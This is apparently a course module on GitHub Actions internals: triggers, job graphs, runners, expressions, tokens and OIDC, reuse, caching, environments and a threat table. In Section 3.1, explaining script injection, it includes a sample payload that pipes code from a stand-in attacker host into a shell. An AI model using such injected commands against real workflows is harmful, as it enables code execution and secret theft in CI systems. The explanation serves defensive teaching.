# GitHub Actions: Core Concepts

| | |
|---|---|
| **Cluster** | 06 CI/CD Pipelines |
| **Role** | Anchor |
| **Prerequisites** | [01-installation-and-setup.md](01-installation-and-setup.md), YAML, Git refs and PR mechanics |
| **Target version** | GitHub.com (2025+), `actions/*@v4`, runner 2.32x+ |
| **Capstone phase** | Phase 1 (Months 1-4) |

> This file explains *how GitHub Actions works*, not which buttons to press. You will understand the event model and filters, how the DAG is built and pruned, what a runner actually does with a job, how contexts and expressions are evaluated (and why that is a security boundary), how `GITHUB_TOKEN` and OIDC tokens are minted, the three reuse mechanisms and when to pick each, how environments gate deployments, and the threat model you must design against.

---

## 1. The Event Model

### 1.1 Every run starts with a webhook event

GitHub emits an internal event for almost everything that happens to a repository. A workflow's `on:` block subscribes to some of them. When an event fires, the Actions service reads the workflow files **from the commit the event refers to** (with important exceptions below), evaluates filters, and creates a *workflow run* if any match.

```yaml
on:
  push:
    branches: [main, 'release/**']
    tags: ['v*.*.*']
    paths: ['services/fastapi-api/**', '.github/workflows/ci-fastapi.yml']
    paths-ignore: ['**/*.md']
  pull_request:
    types: [opened, synchronize, reopened, ready_for_review]
    branches: [main]
  workflow_dispatch:
    inputs:
      environment:
        description: Target environment
        type: choice
        options: [staging, production]
        required: true
      dry_run:
        type: boolean
        default: true
      image_tag:
        type: string
        description: Image tag to deploy (defaults to latest build)
  schedule:
    - cron: '0 2 * * 1-5'       # 02:00 UTC, Monday-Friday
  workflow_call:
    inputs:
      python-version:
        type: string
        default: '3.12'
    secrets:
      SONAR_TOKEN:
        required: true
    outputs:
      image-digest:
        value: ${{ jobs.build.outputs.digest }}
  release:
    types: [published]
```

| Event | Checked-out ref (`GITHUB_SHA`) | Token permissions on fork PRs | Typical use |
|---|---|---|---|
| `push` | the pushed commit | n/a | CI on `main`, release tags |
| `pull_request` | **merge commit** of PR head onto base (`refs/pull/N/merge`) | read-only, no secrets | PR validation |
| `pull_request_target` | **base branch** commit; workflow from base | full write, secrets available | labelling, commenting; dangerous if you check out PR code |
| `workflow_dispatch` | the selected branch/tag | n/a | manual deploys, ops tasks |
| `schedule` | default branch | n/a | nightly jobs; runs only on the default branch |
| `workflow_call` | caller's ref | inherits caller's | reusable workflows |
| `release` | the tag | n/a | publish artifacts |
| `workflow_run` | default branch | full | run after another workflow completes (post-PR processing with write access) |
| `repository_dispatch` | default branch | n/a | triggered via API from external systems |
| `issue_comment` | default branch | full | ChatOps (`/deploy staging`) |

Three rules worth memorising:

1. **`paths` and `paths-ignore` are mutually exclusive within the same event** (as are `branches` and `branches-ignore`). Use negation patterns (`!docs/**`) if you need both behaviours.
2. **`schedule` only runs on the default branch**, and GitHub disables scheduled workflows in repositories with no activity for 60 days.
3. **A `push` made with `GITHUB_TOKEN` does not trigger workflows.** This prevents infinite loops. If you need a chain (for example, a release workflow after a version-bump commit), use a GitHub App token or `workflow_run`.

### 1.2 Filters are evaluated before the run exists

`branches`, `tags` and `paths` filters are evaluated by the Actions service and, if nothing matches, no run is created (nothing appears in the UI). This is different from `if:` conditions, which are evaluated by the already-created run and show as *skipped*. A required status check that is filtered out by `paths` will never report, which blocks the PR; the fix is either a separate tiny workflow that always reports success for those paths, or `dorny/paths-filter` inside a single always-running workflow.

### 1.3 Activity types

`pull_request` defaults to `opened`, `synchronize`, `reopened`. If you want to run when a draft is marked ready, add `ready_for_review`; if you want to skip drafts entirely:

```yaml
jobs:
  ci:
    if: github.event.pull_request.draft == false
```

---

## 2. The DAG: Jobs, `needs`, `if`, Matrix

### 2.1 Jobs are the unit of scheduling

Each job gets a fresh runner. Jobs with no `needs` start in parallel. `needs` builds the DAG:

```yaml
jobs:
  lint:    { runs-on: ubuntu-24.04, steps: [...] }
  test:    { runs-on: ubuntu-24.04, steps: [...] }
  build:
    needs: [lint, test]
    runs-on: ubuntu-24.04
    outputs:
      digest: ${{ steps.push.outputs.digest }}
    steps: [...]
  deploy:
    needs: build
    if: github.ref == 'refs/heads/main' && github.event_name == 'push'
    environment: staging
    runs-on: ubuntu-24.04
    steps:
      - run: echo "Deploying ${{ needs.build.outputs.digest }}"
```

```mermaid
flowchart LR
    lint --> build
    test --> build
    build --> deploy
```

A dependent job is **skipped** if any job it `needs` failed or was skipped, *unless* its `if:` uses `always()`, `!cancelled()`, or inspects `needs.<job>.result`. The success functions:

| Function | True when |
|---|---|
| `success()` (default) | all previous steps/jobs in the chain succeeded |
| `failure()` | any previous step/job failed |
| `cancelled()` | the run was cancelled |
| `always()` | always, even on cancel (use `!cancelled()` if you do *not* want to run on cancel) |

Passing data between jobs happens only through `outputs` (strings up to 1 MB per job, 50 MB per run) or artifacts. `needs.<job>.outputs.<name>` is the only legitimate inter-job variable channel; environment variables do not cross job boundaries.

### 2.2 Matrix

`strategy.matrix` fans one job definition out into many. Combinations are the cartesian product of the axes; `include` adds or decorates combinations; `exclude` removes them.

```yaml
jobs:
  test:
    runs-on: ${{ matrix.os }}
    strategy:
      fail-fast: false            # let all legs finish; default true cancels siblings on first failure
      max-parallel: 4
      matrix:
        os: [ubuntu-24.04, windows-2022]
        python: ['3.11', '3.12', '3.13']
        exclude:
          - os: windows-2022
            python: '3.11'
        include:
          - os: ubuntu-24.04
            python: '3.12'
            coverage: true         # adds a key only to this combination
          - os: macos-14
            python: '3.12'         # adds a new combination
    steps:
      - uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683 # v4.2.2
      - uses: actions/setup-python@0b93645e9fea7318ecaed2b359559ac225c90a2b # v5.3.0
        with:
          python-version: ${{ matrix.python }}
          cache: pip
      - run: pytest ${{ matrix.coverage && '--cov=app --cov-report=xml' || '' }}
```

Dynamic matrices come from a previous job's output parsed with `fromJSON`:

```yaml
jobs:
  plan:
    runs-on: ubuntu-24.04
    outputs:
      services: ${{ steps.detect.outputs.services }}
    steps:
      - uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683 # v4.2.2
      - id: detect
        run: |
          # emit a JSON array of changed service directories
          services=$(git diff --name-only "${{ github.event.before }}" "${{ github.sha }}" \
            | awk -F/ '/^services\//{print $2}' | sort -u | jq -R . | jq -sc .)
          echo "services=${services}" >> "$GITHUB_OUTPUT"
  build:
    needs: plan
    if: needs.plan.outputs.services != '[]'
    strategy:
      matrix:
        service: ${{ fromJSON(needs.plan.outputs.services) }}
    runs-on: ubuntu-24.04
    steps:
      - run: echo "build ${{ matrix.service }}"
```

Limits: 256 jobs per matrix, and the run is cancelled if `fail-fast` is true and any leg fails.

### 2.3 Job-level controls

| Key | Purpose | Default |
|---|---|---|
| `timeout-minutes` | kill the job after N minutes | 360 (set it; a hung job costs money) |
| `continue-on-error` | mark job success even if it fails (matrix legs for experimental versions) | false |
| `concurrency` | one run per group; `cancel-in-progress` cancels older runs | none |
| `environment` | bind to an environment and its protection rules/secrets | none |
| `container` | run all steps inside this image instead of on the VM | none |
| `services` | sidecar containers (Postgres, Redis) reachable by hostname = service id | none |
| `permissions` | override token scopes for this job | workflow default |
| `defaults.run` | default `shell` and `working-directory` | bash, repo root |

```yaml
concurrency:
  group: ${{ github.workflow }}-${{ github.event.pull_request.number || github.ref }}
  cancel-in-progress: ${{ github.event_name == 'pull_request' }}
```

That idiom cancels superseded PR runs but never cancels an in-flight `main` deployment. Use a deploy-specific group with `cancel-in-progress: false` for production so deployments queue rather than cancel.

### 2.4 Service containers and job containers

```yaml
jobs:
  integration:
    runs-on: ubuntu-24.04
    container:
      image: ghcr.io/astral-sh/uv:python3.12-bookworm-slim
      options: --user 1001
    services:
      postgres:
        image: postgres:16-alpine
        env:
          POSTGRES_USER: app
          POSTGRES_PASSWORD: localdev-only
          POSTGRES_DB: app
        options: >-
          --health-cmd "pg_isready -U app"
          --health-interval 5s --health-timeout 5s --health-retries 10
    env:
      DATABASE_URL: postgresql://app:localdev-only@postgres:5432/app
    steps:
      - uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683 # v4.2.2
      - run: uv sync --frozen && uv run pytest tests/integration
```

When the job runs in a `container`, services are on the same Docker network and reachable by name. When the job runs directly on the VM, map ports (`ports: ['5432:5432']`) and connect to `localhost`. The `POSTGRES_PASSWORD` above is an obvious throwaway for an ephemeral sidecar; it is not a secret.

---

## 3. Steps and the Runner

### 3.1 What the runner does with a job

```mermaid
sequenceDiagram
    participant S as Actions service
    participant R as Runner
    participant A as Action repos
    S->>R: job message (steps, env, GITHUB_TOKEN, matrix values)
    R->>R: Set up job: resolve runs-on, create workspace, start services
    R->>A: download every `uses:` action at the pinned ref
    loop each step
        R->>R: evaluate `if:`; render `${{ }}` into literal values
        R->>R: run (bash/pwsh script or action entrypoint)
        R->>S: stream logs; read $GITHUB_OUTPUT, $GITHUB_ENV, $GITHUB_PATH
    end
    R->>S: upload summary, mark job result
    R->>R: Complete job: stop services, wipe workspace (hosted: destroy VM)
```

Order matters: **expressions are rendered before the step runs**, substituting the literal value into the script text. This is why `run: echo "${{ github.event.issue.title }}"` is a shell-injection vulnerability: a title of `"; curl evil.example.com | sh; "` becomes part of the script. Always route untrusted values through `env:`.

### 3.2 Step keys

```yaml
steps:
  - name: Human-readable name
    id: build                              # needed to reference outputs
    if: ${{ runner.os == 'Linux' }}
    uses: docker/build-push-action@4f58ea79222b3b9dc2c8bbdd6debcef730109a75 # v6.9.0
    with:
      context: .
      push: true
    env:
      DOCKER_BUILD_SUMMARY: "true"
    timeout-minutes: 20
    continue-on-error: false

  - name: Shell step
    shell: bash                            # bash is the default on Linux/macOS; pwsh on Windows
    working-directory: services/fastapi-api
    run: |
      set -euo pipefail
      uv run pytest -q
```

Default `shell: bash` on GitHub-hosted runners actually invokes `bash --noprofile --norc -eo pipefail {0}`, so `set -euo pipefail` is only needed when you specify `shell: sh` or a custom shell. Available shells: `bash`, `sh`, `pwsh`, `powershell`, `python`, `cmd`, or custom `shell: node {0}`.

### 3.3 Communicating out of a step: the environment files

| File | Purpose | Example |
|---|---|---|
| `$GITHUB_OUTPUT` | set a step output (`steps.<id>.outputs.<name>`) | `echo "digest=sha256:abc" >> "$GITHUB_OUTPUT"` |
| `$GITHUB_ENV` | set an env var for **subsequent** steps in the job | `echo "VERSION=1.4.2" >> "$GITHUB_ENV"` |
| `$GITHUB_PATH` | prepend to `PATH` for subsequent steps | `echo "$HOME/.local/bin" >> "$GITHUB_PATH"` |
| `$GITHUB_STEP_SUMMARY` | Markdown appended to the run summary page | `echo "## Results" >> "$GITHUB_STEP_SUMMARY"` |
| `$GITHUB_STATE` | state visible to the same action's `post:` step | used by actions, rarely by hand |

Multi-line values use heredoc delimiters:

```bash
{
  echo "plan<<EOF"
  terraform show -no-color tfplan
  echo "EOF"
} >> "$GITHUB_OUTPUT"
```

Workflow commands (`::add-mask::`, `::error file=...,line=...::msg`, `::group::`, `::endgroup::`, `::notice::`, `::warning::`) are still written to stdout. `set-output` and `set-env` commands were removed for security; use the files.

```bash
echo "::add-mask::${GENERATED_PASSWORD}"
echo "::group::Dependency tree"; uv tree; echo "::endgroup::"
echo "::error file=app/main.py,line=42,title=Type error::Incompatible return type"
```

### 3.4 Workspace layout on a runner

| Variable | Hosted runner value | Meaning |
|---|---|---|
| `GITHUB_WORKSPACE` | `/home/runner/work/<repo>/<repo>` | where `actions/checkout` puts the code |
| `RUNNER_TEMP` | `/home/runner/work/_temp` | scratch, wiped after job |
| `RUNNER_TOOL_CACHE` | `/opt/hostedtoolcache` | where `setup-*` actions install toolchains |
| `GITHUB_ACTION_PATH` | path of the running composite action | for referencing action-local files |

---

## 4. Contexts, Expressions and Functions

### 4.1 Expression syntax

`${{ <expression> }}`. Inside `if:` the braces are optional. Literals: strings in single quotes, numbers, `true`/`false`/`null`. Operators: `.` and `[]` for property access, `!`, `==`, `!=`, `<`, `<=`, `>`, `>=`, `&&`, `||`, grouping `()`. Comparison is loosely typed and case-insensitive for strings.

### 4.2 Contexts

| Context | Contains | Available in |
|---|---|---|
| `github` | event payload and run metadata: `repository`, `ref`, `ref_name`, `sha`, `actor`, `event_name`, `event.*`, `run_id`, `run_attempt`, `head_ref`, `base_ref`, `token`, `server_url`, `workspace` | everywhere |
| `env` | variables from `env:` blocks (not `$GITHUB_ENV` within the same step) | most places; not in `jobs.<id>.if` or `runs-on` |
| `vars` | configuration variables (non-secret) at repo/env/org level | everywhere |
| `secrets` | secrets, plus `secrets.GITHUB_TOKEN` | job/step level; not in `if:` at job level |
| `job` | `status`, `container.id`, `services.<id>.ports` | within a job |
| `steps` | `steps.<id>.outputs.*`, `.outcome`, `.conclusion` | after the step |
| `needs` | `needs.<job>.outputs.*`, `.result` | dependent jobs |
| `matrix` | current combination | matrix jobs |
| `strategy` | `fail-fast`, `job-index`, `job-total`, `max-parallel` | matrix jobs |
| `runner` | `os`, `arch`, `name`, `temp`, `tool_cache`, `debug` | within a job |
| `inputs` | `workflow_dispatch` or `workflow_call` inputs | everywhere |

`steps.<id>.outcome` is the result before `continue-on-error` is applied; `conclusion` is after. Use `outcome` to detect a soft failure you want to report.

### 4.3 Functions

| Function | Example | Note |
|---|---|---|
| `contains(search, item)` | `contains(github.event.pull_request.labels.*.name, 'deploy')` | works on strings and arrays |
| `startsWith(s, prefix)` / `endsWith` | `startsWith(github.ref, 'refs/tags/v')` | case-insensitive |
| `format(fmt, ...)` | `format('ghcr.io/{0}:{1}', github.repository, github.sha)` | `{0}` placeholders |
| `join(array, sep)` | `join(matrix.*, '-')` | |
| `toJSON(value)` | `toJSON(github.event)` | debugging payloads |
| `fromJSON(string)` | `fromJSON(needs.plan.outputs.matrix)` | also converts `'true'` to boolean, `'42'` to number |
| `hashFiles(glob...)` | `hashFiles('**/uv.lock')` | SHA-256 over matching files; cache keys |
| `success()` `failure()` `cancelled()` `always()` | `if: failure()` | status checks |

Object filters: `github.event.commits.*.message` yields an array of all commit messages.

### 4.4 Where expressions are dangerous

Every expression that pulls attacker-controlled text into a `run:` script is an injection. Attacker-controlled fields include (non-exhaustive): `github.event.issue.title`, `github.event.issue.body`, `github.event.pull_request.title`, `github.event.pull_request.body`, `github.event.comment.body`, `github.event.review.body`, `github.event.pages.*.page_name`, `github.event.commits.*.message`, `github.event.head_commit.author.email`, `github.head_ref`. Safe pattern:

```yaml
- env:
    TITLE: ${{ github.event.pull_request.title }}
  run: |
    if [[ ! "$TITLE" =~ ^(feat|fix|chore|docs)(\(.+\))?!?:\ .+ ]]; then
      echo "::error::PR title must follow Conventional Commits"; exit 1
    fi
```

---

## 5. Identity: `GITHUB_TOKEN` and OIDC

### 5.1 `GITHUB_TOKEN`

For every job, GitHub mints an installation access token for the "GitHub Actions" app, valid for the job's duration (max 24 h), scoped to the repository, with the permissions you declare. Declare them at the top level (applies to all jobs) and override per job when one job needs more:

```yaml
permissions:
  contents: read          # everything else is "none"

jobs:
  release:
    permissions:
      contents: write     # create the release
      packages: write     # push to GHCR
      id-token: write     # request OIDC tokens
      attestations: write # store build provenance
```

Full scope list: `actions`, `attestations`, `checks`, `contents`, `deployments`, `discussions`, `id-token`, `issues`, `models`, `packages`, `pages`, `pull-requests`, `repository-projects`, `security-events`, `statuses`. Values: `read`, `write`, `none`. Writing `permissions: {}` grants nothing. On fork PRs the token is always read-only regardless of what you declare.

### 5.2 OIDC: how the exchange works

```mermaid
sequenceDiagram
    participant J as Job (runner)
    participant G as GitHub OIDC provider<br/>token.actions.githubusercontent.com
    participant C as Cloud STS (AWS / Entra / GCP)
    J->>G: POST $ACTIONS_ID_TOKEN_REQUEST_URL (audience=sts.amazonaws.com)
    G-->>J: signed JWT {iss, sub, aud, repository, ref, environment, job_workflow_ref, ...}
    J->>C: AssumeRoleWithWebIdentity(JWT, RoleArn)
    C->>G: fetch JWKS from /.well-known/openid-configuration, verify signature
    C->>C: evaluate trust policy conditions against claims
    C-->>J: temporary credentials (15 min - 1 h)
```

The JWT's claims are the authorisation surface. The default `sub` claim formats:

| Trigger | `sub` claim |
|---|---|
| push to branch | `repo:<ORG>/<REPO>:ref:refs/heads/main` |
| tag | `repo:<ORG>/<REPO>:ref:refs/tags/v1.2.3` |
| pull_request | `repo:<ORG>/<REPO>:pull_request` |
| job with `environment:` | `repo:<ORG>/<REPO>:environment:production` (environment wins over ref) |

Other useful claims: `repository_owner`, `repository_id` (immune to renames), `job_workflow_ref` (`<ORG>/<REPO>/.github/workflows/deploy.yml@refs/heads/main`, perfect for reusable-workflow trust), `runner_environment` (`github-hosted` vs `self-hosted`), `actor`, `workflow_ref`. You can customise the `sub` template per repository via the API (`actions/oidc/customization/sub`) to include `job_workflow_ref` or `runner_environment`.

The cloud-side trust policies are in [05-production-patterns.md](05-production-patterns.md#oidc-trust-policies). The in-workflow side is three lines each:

```yaml
- uses: aws-actions/configure-aws-credentials@e3dd6a429d7300a6a4c196c26e071d42e0343502 # v4.0.2
  with:
    role-to-assume: arn:aws:iam::123456789012:role/gha-capstone-staging
    aws-region: eu-west-1
    role-session-name: gha-${{ github.run_id }}

- uses: azure/login@a65d910e8af852a8061c627c456678983e180302 # v2.2.0
  with:
    client-id: ${{ vars.AZURE_CLIENT_ID }}
    tenant-id: ${{ vars.AZURE_TENANT_ID }}
    subscription-id: ${{ vars.AZURE_SUBSCRIPTION_ID }}

- uses: google-github-actions/auth@6fc4af4b145ae7821d527454aa9bd537d1f2dc5f # v2.1.7
  with:
    workload_identity_provider: projects/<PROJECT_NUMBER>/locations/global/workloadIdentityPools/github/providers/capstone
    service_account: gha-deploy@<PROJECT_ID>.iam.gserviceaccount.com
```

Note that Azure/GCP identifiers are **not secrets** (they are stored as `vars`); only the trust configuration on the cloud side authorises them.

### 5.3 Secrets

| Level | Scope | Who can read | Notes |
|---|---|---|---|
| Repository | all workflows in repo | workflows (not fork PRs) | 48 KB max; use `gh secret set` |
| Environment | jobs with `environment: <name>` | only after protection rules pass | the right place for deploy credentials |
| Organisation | selected repos | selected repos' workflows | with access policy (all/private/selected) |
| Dependabot | `dependabot[bot]` runs only | Dependabot PR workflows | separate store; `gh secret set --app dependabot` |
| Codespaces | dev containers | | not Actions |

Secrets are masked in logs by exact string match. A secret that is base64-encoded, split, or JSON-wrapped is **not** masked; `::add-mask::` derived values yourself. Secrets passed to reusable workflows need `secrets: inherit` or an explicit mapping.

---

## 6. Reuse: Three Mechanisms

| | Reusable workflow | Composite action | JavaScript / Docker action |
|---|---|---|---|
| Unit | whole workflow (jobs) | sequence of steps | single step with real code |
| Called by | `jobs.<id>.uses: org/repo/.github/workflows/x.yml@ref` | `steps[].uses: org/repo/path@ref` | `steps[].uses` |
| Gets its own runner | yes (each job) | no (runs in caller's job) | no |
| Can use `secrets`, `environment`, `matrix` | yes | no `secrets` context (pass as `with:`) | no |
| Can call other reusables | up to 4 levels of nesting | composites can nest | n/a |
| Best for | organisation-standard pipelines (build-sign-deploy) | bundling 3-10 steps (setup toolchain + cache + login) | logic that needs an SDK, API calls, non-trivial parsing |
| Governance | can be *required* via rulesets ("required workflows") | | |

### 6.1 Reusable workflow

`.github/workflows/build-image.yml` in the platform repo:

```yaml
name: build-image
on:
  workflow_call:
    inputs:
      context: { type: string, required: true }
      image:   { type: string, required: true }
    outputs:
      digest:
        value: ${{ jobs.build.outputs.digest }}
    secrets: {}
permissions: {}
jobs:
  build:
    runs-on: ubuntu-24.04
    permissions:
      contents: read
      packages: write
      id-token: write
      attestations: write
    outputs:
      digest: ${{ steps.push.outputs.digest }}
    steps:
      - uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683 # v4.2.2
      - uses: docker/setup-buildx-action@c47758b77c9736f4b2ef4073d4d51994fabfe349 # v3.7.1
      - uses: docker/login-action@9780b0c442fbb1117ed29e0efdff1e18412f7567 # v3.3.0
        with:
          registry: ghcr.io
          username: ${{ github.actor }}
          password: ${{ secrets.GITHUB_TOKEN }}
      - id: push
        uses: docker/build-push-action@4f58ea79222b3b9dc2c8bbdd6debcef730109a75 # v6.9.0
        with:
          context: ${{ inputs.context }}
          push: true
          tags: ${{ inputs.image }}:${{ github.sha }}
          provenance: mode=max
          sbom: true
          cache-from: type=gha
          cache-to: type=gha,mode=max
```

Caller:

```yaml
jobs:
  image:
    uses: <ORG>/platform-workflows/.github/workflows/build-image.yml@f1d2d2f924e986ac86fdf7b36c94bcdf32beec15 # v1.3.0
    permissions:
      contents: read
      packages: write
      id-token: write
      attestations: write
    with:
      context: services/fastapi-api
      image: ghcr.io/<org>/fastapi-api
    secrets: inherit
```

The caller must grant at least the permissions the callee declares; the callee cannot escalate.

### 6.2 Composite action

`.github/actions/setup-python-uv/action.yml`:

```yaml
name: Setup Python with uv
description: Install uv, pin Python, restore the uv cache
inputs:
  python-version:
    description: Python version
    default: '3.12'
outputs:
  cache-hit:
    description: Whether the uv cache was restored
    value: ${{ steps.cache.outputs.cache-hit }}
runs:
  using: composite
  steps:
    - uses: astral-sh/setup-uv@f3bcaebff5eace81a1c062af9f9011aae482ca9d # v3.1.7
      with:
        version: "0.5.x"
    - shell: bash
      run: uv python install "${{ inputs.python-version }}"
    - id: cache
      uses: actions/cache@6849a6489940f00c2f30c0fb92c6274307ccb58a # v4.1.2
      with:
        path: ~/.cache/uv
        key: uv-${{ runner.os }}-${{ inputs.python-version }}-${{ hashFiles('**/uv.lock') }}
        restore-keys: uv-${{ runner.os }}-${{ inputs.python-version }}-
```

Used as `uses: ./.github/actions/setup-python-uv` (local, same checkout) or `uses: <ORG>/platform-actions/setup-python-uv@<sha>`. Every `run:` in a composite **must** declare `shell:`.

### 6.3 JavaScript action

`action.yml`:

```yaml
name: PR size label
description: Labels a PR by changed lines
inputs:
  token: { description: GitHub token, required: true }
runs:
  using: node20
  main: dist/index.js
```

`src/index.js`:

```javascript
const core = require('@actions/core');
const github = require('@actions/github');

async function run() {
  try {
    const token = core.getInput('token', { required: true });
    const octokit = github.getOctokit(token);
    const { owner, repo } = github.context.repo;
    const pr = github.context.payload.pull_request;
    if (!pr) { core.info('Not a pull request; skipping'); return; }

    const { data } = await octokit.rest.pulls.get({ owner, repo, pull_number: pr.number });
    const changed = data.additions + data.deletions;
    const label = changed < 50 ? 'size/XS' : changed < 200 ? 'size/S' : changed < 800 ? 'size/M' : 'size/L';

    await octokit.rest.issues.addLabels({ owner, repo, issue_number: pr.number, labels: [label] });
    core.setOutput('label', label);
    await core.summary.addHeading('PR size').addRaw(`${changed} lines changed → ${label}`).write();
  } catch (err) {
    core.setFailed(err.message);
  }
}
run();
```

Bundle with `ncc build src/index.js -o dist --license licenses.txt` and commit `dist/`. The runner executes it with its bundled Node 20 runtime; no install step.

### 6.4 Docker container action

```yaml
name: Trivy config scan
description: Runs trivy config against a directory
inputs:
  path: { description: Directory to scan, default: '.' }
runs:
  using: docker
  image: Dockerfile
  args: ["config", "--exit-code", "1", "--severity", "HIGH,CRITICAL", "${{ inputs.path }}"]
```

```dockerfile
FROM aquasec/trivy:0.57.1
USER 65532:65532
ENTRYPOINT ["trivy"]
```

Docker actions only run on Linux runners and add image-build time per job unless `image: docker://aquasec/trivy:0.57.1` is used to pull a prebuilt image.

---

## 7. Caching and Artifacts

### 7.1 Caching

`actions/cache` stores a tarball keyed by a string, scoped to the repository, 10 GB total with LRU eviction after 7 days unused. Cache entries created on a PR branch are visible to that branch and to the base branch's descendants; entries created on `main` are visible to every branch. This means **you should warm caches on `main`** so PRs hit them.

```yaml
- uses: actions/cache@6849a6489940f00c2f30c0fb92c6274307ccb58a # v4.1.2
  with:
    path: |
      ~/.m2/repository
      ~/.gradle/caches
    key: maven-${{ runner.os }}-${{ hashFiles('**/pom.xml') }}
    restore-keys: |
      maven-${{ runner.os }}-
```

`restore-keys` is a prefix match returning the most recent entry; a partial hit still needs a save with the exact key at the end of the job. `actions/cache/restore` and `actions/cache/save` split the two phases when you want to save even on failure. Built-in caching in `setup-python` (`cache: pip|poetry|pipenv`), `setup-java` (`cache: maven|gradle|sbt`), `setup-node` (`cache: npm|yarn|pnpm`), `setup-go` covers the common case without a separate step; `astral-sh/setup-uv` has `enable-cache: true`. Docker layer caching uses `cache-from/cache-to: type=gha` via buildx.

### 7.2 Artifacts v4

```yaml
- uses: actions/upload-artifact@b4b15b8c7c6ac21ea08fcf65892d2ee8f75cf882 # v4.4.3
  with:
    name: sbom-${{ matrix.service }}
    path: sbom.cdx.json
    retention-days: 30
    if-no-files-found: error
    compression-level: 6

# later job
- uses: actions/download-artifact@fa0a91b85d4f404e444e00e005971372dc801d16 # v4.1.8
  with:
    pattern: sbom-*
    merge-multiple: true
    path: sboms/
```

v4 changed the semantics: artifacts are **immutable** once uploaded, names must be **unique within a run** (matrix jobs must include the matrix value in the name), uploads are 10x faster, and the artifact ID and URL are outputs. Retention defaults to 90 days (public) and is configurable per repository. Artifacts are for *within-run* and *for-humans* data; durable outputs (images, packages) go to a registry.

---

## 8. Environments and Deployment Protection

An environment is a named target (`staging`, `production`) with:

- **Secrets and variables** that only jobs bound to it can read.
- **Protection rules**: required reviewers (up to 6 users/teams; optionally prevent self-review), wait timer (0-43,200 minutes), deployment branches and tags (only `main`, only `v*` tags), and **custom deployment protection rules** implemented by GitHub Apps (for example, a Datadog monitor check, a ServiceNow change window, or your own app querying Argo CD health).
- A **deployment history** visible in the repository's Deployments tab, with a deployment status that Argo CD or your deploy step can update.

```yaml
jobs:
  deploy-prod:
    needs: deploy-staging
    runs-on: ubuntu-24.04
    environment:
      name: production
      url: https://api.example.com
    permissions:
      id-token: write
      contents: read
    steps:
      - uses: aws-actions/configure-aws-credentials@e3dd6a429d7300a6a4c196c26e071d42e0343502 # v4.0.2
        with:
          role-to-assume: arn:aws:iam::123456789012:role/gha-capstone-production
          aws-region: eu-west-1
      - run: ./scripts/deploy.sh production
```

When the job starts, the run pauses until reviewers approve (they see the commit, the triggering actor and the pending jobs). Combine this with the OIDC `sub` claim `repo:<ORG>/<REPO>:environment:production` so the production role can **only** be assumed after approval; the trust policy enforces what the UI promised.

---

## 9. Runners

| Runner type | Lifecycle | Use when | Watch out for |
|---|---|---|---|
| GitHub-hosted standard (`ubuntu-24.04`, `windows-2022`, `macos-14`) | fresh VM per job, destroyed after | default | preinstalled tool versions change monthly; pin with `setup-*` |
| GitHub-hosted larger runners (4-64 vCPU, GPU, arm64) | same | heavy builds, GPU tests | per-minute price scales; org-level only |
| Self-hosted persistent | long-lived VM, runs many jobs | legacy, special hardware | state leaks, patching burden, never for public repos |
| Self-hosted ephemeral (`--ephemeral`) | one job, then deregister | VPC access, compliance | you provide re-registration automation |
| ARC runner scale set | pod per job on Kubernetes | platform teams at scale | Docker builds need DinD or Kubernetes mode; image maintenance |

GitHub-hosted runners have a 6-hour job limit, 35-day workflow limit, 14 GB SSD, and outbound internet. Self-hosted have no job limit but must reach `*.actions.githubusercontent.com`, `api.github.com`, `pipelines.actions.githubusercontent.com` and the blob storage hosts; the full list is at `GET /meta` under `actions`.

---

## 10. Security Model Summary

The threats, in rough order of real-world frequency:

| Threat | Mechanism | Primary defence |
|---|---|---|
| Script injection | attacker text rendered into `run:` | `env:` indirection; zizmor; CodeQL `actions` queries |
| `pull_request_target` abuse | base-branch workflow checks out fork code with write token | never `checkout` with `ref: github.event.pull_request.head.sha` under `pull_request_target`; or do it with `persist-credentials: false` and no secrets |
| Compromised third-party action | mutable tag repointed to malicious commit | SHA pinning + Dependabot for actions + allowlist |
| Over-privileged token | default write permissions | repository default read; explicit `permissions:` |
| Secret exfiltration | malicious step reads `secrets.*` | environments with reviewers; OIDC instead of secrets; egress control (`harden-runner`) |
| Cache poisoning | PR writes a cache entry that `main` later restores | caches from PRs are not visible to `main`; never restore caches containing executables from untrusted scopes |
| Artifact poisoning | `workflow_run` downloads an artifact built from fork code and executes it | treat artifacts from untrusted runs as data, validate, never execute |
| Self-hosted runner persistence | malware survives between jobs | ephemeral runners only; no self-hosted on public repos |

The implementation of each defence is in [05-production-patterns.md](05-production-patterns.md). Continue to [03-commands-and-cheatsheet.md](03-commands-and-cheatsheet.md) for the reference.
